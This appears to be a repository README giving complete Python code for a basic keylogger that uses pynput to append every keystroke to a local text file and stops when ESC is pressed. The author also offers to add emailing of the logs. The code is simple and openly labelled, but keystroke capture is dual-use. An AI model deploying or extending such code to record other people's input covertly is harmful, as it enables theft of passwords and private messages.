# Keylogger

Welcome to the repository of a simple keylogger! A **keylogger** is a program that records your keystrokes, and this program saves them in a log file on your local computer.


The following will provide documentation on how to make a keylogger. You can extend the capabilities of your program by using other libraries. 

If you want me to add to this program sending messages to mail, then write in comments in my [publick](https://t.me/coder_trash)


# Beginning

*Before you start, install the [library](https://pypi.org/project/pynput/)*:

```python
pip install pynput
```

```
from pynput import keyboard
```

Function that triggers when pressed and writes data to the `test.txt` file

```python
def on_press(key):
    global count_ctrl, count_shift

    try:
        key = key.char
    except:
        key = str(key).split(".")[1].upper()
        key = f"[{key}]"

    with open("test.txt", "a", encoding="UTF-8") as file:
        if key == "[ENTER]":
            file.write(key)
            file.write("\n")
        elif key == "[CAPS_LOCK]":
            count_ctrl += 1
        elif key == "[SHIFT]":
            count_shift = True
        else:
            if count_ctrl % 2 == 0 or count_shift:
                file.write(key.upper())
            else:
                file.write(key)

```

The on_release function is triggered when the button is pressed and terminates the program when `ESC` is pressed.  

```python
def on_release(key):
    global count_shift
    if key == keyboard.Key.esc:
        return False
    
    if key == keyboard.Key.shift:
        count_shift = False
```

**Be sure to remember to write the code below so that your program does not crash:**

```python
count_ctrl = 1
count_shift = False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

